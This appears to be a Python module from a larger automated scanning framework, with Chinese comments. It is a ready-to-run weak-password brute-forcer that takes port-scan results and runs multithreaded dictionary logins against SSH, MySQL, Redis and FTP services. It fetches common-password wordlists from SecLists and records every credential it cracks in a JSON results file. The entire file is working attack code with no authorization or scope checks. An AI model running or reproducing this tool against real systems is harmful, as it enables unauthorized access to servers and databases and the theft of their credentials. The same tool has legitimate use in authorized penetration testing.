#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
weakpass.py - 弱口令爆破工具模块
由调度系统调用，对 SSH/MySQL/Redis/FTP 服务执行弱口令字典爆破
依赖: paramiko, pymysql, redis, requests
"""

import os
import json
import time
import datetime
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests

from tools import RESULTS_BASE

# ==================== 工具接口变量 ====================
TOOL_NAME = "弱口令爆破"
TOOL_ID = "weakpass"
TOOL_DESC = "对 SSH/MySQL/Redis/FTP 服务执行弱口令字典爆破"
TOOL_CATEGORY = "credential"

# ==================== 配置区 ====================
DICT_DIR = os.path.join(os.path.dirname(__file__), '..', 'dict')
THREAD_COUNT = 10
TIMEOUT = 3
MAX_RETRY = 2

DICT_URLS = {
    "username.txt": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt",
    "password.txt": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt",
    "ssh_password.txt": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt"
}

# ==================== 颜色与日志 ====================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

class Logger:
    def info(self, msg): print(f"{Colors.BLUE}[INFO] {msg}{Colors.RESET}")
    def success(self, msg): print(f"{Colors.GREEN}[+] {msg}{Colors.RESET}")
    def warning(self, msg): print(f"{Colors.YELLOW}[!] {msg}{Colors.RESET}")
    def error(self, msg): print(f"{Colors.RED}[-] {msg}{Colors.RESET}")
    def raw(self, msg): print(msg)

logger = Logger()

# ==================== 全局变量 ====================
usernames = []
passwords = []
found_credentials = []
found_lock = threading.Lock()
_env_checked = False

# ==================== 1. 环境检测模块 ====================
def check_environment():
    """启动环境自检：依赖库 + 目录 + 字典"""
    global usernames, passwords

    logger.info("=== 启动环境自检 ===")

    # 1. 检查依赖库
    required_libs = {
        "paramiko": "SSH爆破必需",
        "pymysql": "MySQL爆破必需",
        "redis": "Redis爆破必需",
        "requests": "HTTP/Web爆破必需"
    }
    missing = []
    for lib, desc in required_libs.items():
        try:
            __import__(lib)
            logger.success(f"依赖库 {lib} 已安装")
        except ImportError:
            missing.append((lib, desc))

    if missing:
        logger.warning("缺少以下依赖库，请先安装:")
        for lib, desc in missing:
            logger.raw(f"  - {lib}: {desc}")
        logger.raw(f"\n安装命令: pip install {' '.join([x[0] for x in missing])}\n")
        raise RuntimeError(f"缺少依赖库: {', '.join(x[0] for x in missing)}")

    # 2. 创建目录
    os.makedirs(DICT_DIR, exist_ok=True)
    logger.success(f"字典目录已就绪: {DICT_DIR}")

    # 3. 检查并下载字典
    logger.info("检查弱口令字典文件...")
    missing_dicts = []
    for filename, url in DICT_URLS.items():
        filepath = os.path.join(DICT_DIR, filename)
        if os.path.exists(filepath) and os.path.getsize(filepath) > 100:
            logger.success(f"字典已存在: {filename}")
        else:
            logger.warning(f"字典缺失: {filename}，开始下载...")
            try:
                resp = requests.get(url, timeout=30, stream=True)
                if resp.status_code == 200:
                    with open(filepath, 'w', encoding='utf-8') as f:
                        f.write(resp.text)
                    logger.success(f"下载完成: {filename} ({os.path.getsize(filepath)} 字节)")
                else:
                    logger.error(f"下载失败: HTTP {resp.status_code}，请手动放置字典到 {filepath}")
                    missing_dicts.append(filename)
            except Exception as e:
                logger.error(f"下载失败: {e}，请手动放置字典到 {filepath}")
                missing_dicts.append(filename)

    if missing_dicts:
        raise RuntimeError(f"字典下载失败且本地缺失: {', '.join(missing_dicts)}")

    # 4. 校验字典可用性
    usernames = load_dict("username.txt")
    passwords = load_dict("password.txt")

    if not usernames or not passwords:
        raise RuntimeError("字典为空，无法继续爆破")

    logger.info(f"加载完成: 用户名 {len(usernames)} 个, 密码 {len(passwords)} 个")
    logger.success("环境自检通过\n")


def load_dict(filename):
    """加载字典文件，去重并过滤空行"""
    filepath = os.path.join(DICT_DIR, filename)
    if not os.path.exists(filepath):
        return []
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    return list(dict.fromkeys(lines))


# ==================== 2. 各服务爆破实现模块 ====================
def brute_ssh(ip, port, username, password):
    import paramiko
    for _ in range(MAX_RETRY):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=port, username=username, password=password, timeout=TIMEOUT, banner_timeout=TIMEOUT)
            client.close()
            return True
        except paramiko.AuthenticationException:
            return False
        except Exception:
            time.sleep(0.5)
    return False


def brute_mysql(ip, port, username, password):
    import pymysql
    for _ in range(MAX_RETRY):
        try:
            conn = pymysql.connect(host=ip, port=port, user=username, password=password, connect_timeout=TIMEOUT)
            conn.close()
            return True
        except pymysql.err.OperationalError as e:
            if "access denied" in str(e).lower():
                return False
            time.sleep(0.5)
        except Exception:
            time.sleep(0.5)
    return False


def brute_redis(ip, port, username, password):
    import redis
    for _ in range(MAX_RETRY):
        try:
            r = redis.Redis(host=ip, port=port, password=password, socket_timeout=TIMEOUT)
            r.ping()
            return True
        except redis.exceptions.AuthenticationError:
            return False
        except Exception:
            time.sleep(0.5)
    return False


def brute_ftp(ip, port, username, password):
    from ftplib import FTP
    for _ in range(MAX_RETRY):
        try:
            ftp = FTP()
            ftp.connect(ip, port, timeout=TIMEOUT)
            ftp.login(username, password)
            ftp.quit()
            return True
        except Exception as e:
            if "530" in str(e):
                return False
            time.sleep(0.5)
    return False


def run_brute_for_target(target):
    """针对单个目标执行多线程爆破"""
    t_type = target["type"]
    ip = target["ip"]
    port = target["port"]
    service = target["service"].upper()

    logger.info(f"\n开始爆破 {service} {ip}:{port} ...")
    brute_func = {
        "ssh": brute_ssh,
        "mysql": brute_mysql,
        "redis": brute_redis,
        "ftp": brute_ftp
    }[t_type]

    total = len(usernames) * len(passwords)
    count = 0
    found = False

    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        futures = {}
        for u in usernames:
            for p in passwords:
                future = executor.submit(brute_func, ip, port, u, p)
                futures[future] = (u, p)

        for future in as_completed(futures):
            count += 1
            u, p = futures[future]
            try:
                if future.result():
                    logger.success(f"爆破成功! {service} {ip}:{port} -> {u}:{p}")
                    with found_lock:
                        found_credentials.append({
                            "service": service,
                            "target": f"{ip}:{port}",
                            "username": u,
                            "password": p,
                            "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        })
                    found = True
                    break
            except Exception:
                pass

            if count % 100 == 0:
                logger.info(f"进度: {count}/{total} 已尝试")

    if not found:
        logger.warning(f"{service} {ip}:{port} 未爆破出弱口令")


# ==================== 3. 工具入口函数 ====================
def execute(scan_result, target_info):
    """
    执行弱口令爆破。

    Args:
        scan_result: dict, saomiao.py 输出的扫描结果（已解析为 dict）
        target_info: dict, 包含 domain, ip, base_url

    Returns:
        dict: 标准化结果
    """
    global found_credentials, usernames, passwords, _env_checked

    found_credentials = []
    errors = []

    # 环境自检（仅首次）
    if not _env_checked:
        try:
            check_environment()
            _env_checked = True
        except RuntimeError as e:
            logger.error(f"环境检测失败: {e}")
            return {
                "tool": "weakpass",
                "target": target_info.get("domain", ""),
                "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "status": "failed",
                "summary": "环境检测失败",
                "credentials": [],
                "targets_scanned": 0,
                "errors": [str(e)]
            }

    ip = target_info.get("ip", "")
    domain = target_info.get("domain", "")

    # 筛选可爆破目标：ssh / mysql / redis / ftp，排除 CDN 噪声
    brute_targets = []
    for p in scan_result.get("ports", []):
        port = p.get("port")
        service = p.get("service", "").lower()
        confidence = p.get("confidence", "")

        if service in ["ssh", "mysql", "redis", "ftp"] and confidence != "cdn_noise":
            brute_targets.append({
                "type": service,
                "ip": ip,
                "port": port,
                "service": service
            })

    logger.info(f"从扫描结果中提取到 {len(brute_targets)} 个可爆破目标")
    for t in brute_targets:
        logger.raw(f"  - {t['type'].upper()} {t['ip']}:{t['port']}")

    if not brute_targets:
        logger.info("无可爆破目标")
        return {
            "tool": "weakpass",
            "target": domain,
            "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "status": "success",
            "summary": "未发现弱口令",
            "credentials": [],
            "targets_scanned": 0,
            "errors": []
        }

    # 逐目标爆破
    for target in brute_targets:
        try:
            run_brute_for_target(target)
        except KeyboardInterrupt:
            logger.warning("用户中断爆破")
            errors.append("用户中断")
            break
        except Exception as e:
            logger.error(f"目标爆破出错: {e}")
            errors.append(str(e))

    # 保存结果文件
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    result_dir = os.path.join(RESULTS_BASE, "weakpass")
    os.makedirs(result_dir, exist_ok=True)
    result_file = os.path.join(result_dir, f"weakpass_{domain}_{ts}.json")

    result_data = {
        "scan_time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "target": target_info,
        "total_targets": len(brute_targets),
        "credentials_found": len(found_credentials),
        "credentials": found_credentials
    }

    with open(result_file, 'w', encoding='utf-8') as f:
        json.dump(result_data, f, ensure_ascii=False, indent=2)

    logger.raw("\n" + "=" * 60)
    if found_credentials:
        logger.success(f"爆破完成，共发现 {len(found_credentials)} 组有效凭证")
        for cred in found_credentials:
            logger.raw(f"  [{cred['service']}] {cred['target']} -> {cred['username']}:{cred['password']}")
        status = "success"
        summary = f"发现 {len(found_credentials)} 组弱口令"
    elif errors:
        logger.warning(f"爆破完成，部分出错: {errors}")
        status = "partial"
        summary = f"部分目标爆破失败，{len(errors)} 个错误"
    else:
        logger.warning("爆破完成，未发现弱口令")
        status = "failed"
        summary = "未发现弱口令"

    logger.info(f"结果已保存至: {result_file}")

    return {
        "tool": "weakpass",
        "target": domain,
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "status": status,
        "summary": summary,
        "credentials": found_credentials,
        "targets_scanned": len(brute_targets),
        "errors": errors
    }
